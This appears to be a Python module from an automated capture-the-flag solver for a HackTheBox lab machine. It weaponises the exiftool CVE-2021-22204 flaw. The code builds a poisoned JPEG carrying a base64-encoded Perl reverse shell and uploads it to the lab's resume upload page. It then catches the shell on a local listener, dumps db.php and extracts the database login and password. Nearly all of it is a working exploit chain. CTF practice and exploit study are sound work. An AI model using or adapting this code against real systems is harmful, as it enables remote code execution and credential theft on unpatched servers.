#!/bin/env python3


import base64
import subprocess
import os
import logging
import threading
import socket
import requests

import settings
from common_tools import Colors


class Exiftool_exploit(object):
    """docstring for Exiftool_exploit"""

    def __init__(self, port=12345):
        self.account_login = ""
        self.account_password = ""
        self.port = port
        self.ip = settings.ip
        self.payload_img = settings.payloads_folder+'payload.jpg'
        self.djvu_conf = settings.conf_folder+"CVE-2021-22204.conf"


    def get_account_credentials(self):
        """
            return list with account login info and it's password
        """
        return [self.account_login, self.account_password]


    def create_payload(self):
        """
            Create poisoned image with provided information : ip and port
            based on : https://github.com/convisolabs/CVE-2021-22204-exiftool
        """
        print(Colors.begin_info+"Generating payload for exploiting exiftool")
        if not os.path.isfile(self.payload_img):
            raise IOError(f"Payload img not found : {self.payload_img}")

        payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
        payload += base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({self.port},inet_aton('{self.ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )
        payload += b"'))};\")"

        payload_file = open('raw_payload', 'w')
        payload_file.write(payload.decode('utf-8'))
        payload_file.close()

        try:
            subprocess.run(['bzz', 'raw_payload', 'raw_payload.bzz'])
            subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=raw_payload.bzz'])
            subprocess.run(['exiftool', '-config', self.djvu_conf, '-PoisonedTAG<=exploit.djvu', self.payload_img])
        except Exception as e:
            logging.error("Something went wrong : "+str(e))
            raise e
        
        os.remove('raw_payload')
        os.remove('exploit.djvu')
        os.remove('raw_payload.bzz')


    def send_payload(self):
        """
            Send image payload to web server to trigger remote shell
        """

        if not os.path.isfile(self.payload_img):
            print(f"{Colors.begin_error}Wrong path to payload : {self.payload_img}")
            raise IOError(f"Wrong path to payload : {self.payload_img}")

        print(Colors.begin_info+"Sending payload")
        files = {'file': open(self.payload_img, 'rb')}
        r = requests.post("http://devbuild-job.overflow.htb/home/profile/resume_upload.php", files=files)


    def create_listener(self):
        """
            Create listener to retrieve connection after sending payload to remote host.
        """

        print(Colors.begin_info+"Create local listener")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            #TODO
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((settings.ip, self.port))
        except Exception as e:
            print(Colors.begin_error+"Unable to bind socket... ")
            raise e
        sock.listen(1)
        while True:
            self.callback_func(sock)
            break
        sock.close()


    def callback_func(self, sock: socket.socket):
        """
            Callback function for clearer code. 
            Allow to separate creation of listener from commands injection
        """
        conn, addr = sock.accept()
        #error message about tty not handled here but it's not important
        msg = str(conn.recv(1024),'utf8')
        msg = str(conn.recv(1024),'utf8')

        #start to retrieve informations
        print(Colors.begin_success+"Dumping "+Colors.color_files('/var/www/html/config/db.php') +" to retrieve developer password")

        conn.send(b'cat /var/www/html/config/db.php\n')
        msg = str(conn.recv(2048),'utf8')
        print(f"{Colors.begin_success}content of "+Colors.color_files('db.php') +" : {Colors.colorize(msg, 'BLUE')}")

        self.catch_account_credentials(msg)

        conn.send(b'exit\n')
        msg = str(conn.recv(1024),'utf8')
        conn.close()
        return


    def catch_account_credentials(self, cmd_output: str):
        """
            Simple function to dump credentials from db.php
        """

        for line in cmd_output.splitlines():
            if "mysqli_connect" in line:
                self.account_login = line.split(',')[1].replace('"', '').strip()
                self.account_password = line.split(',')[2].replace('"', '').strip()
                print(Colors.begin_success+"Found credentials !!")
                print(Colors.colorize("login : "+self.account_login, 'YELLOW'))
                print(Colors.colorize("password : "+self.account_password, 'YELLOW'))
                return


    def revert_payload_jpg(self):
        """
            Remove payload image from system : 
            because when we generate it, it will be name payload.jpg and original file will become payload.jpg_original
            So revert payload.jpg_original to payload.jpg
        """

        os.remove(self.payload_img)
        os.rename(self.payload_img+'_original', self.payload_img)




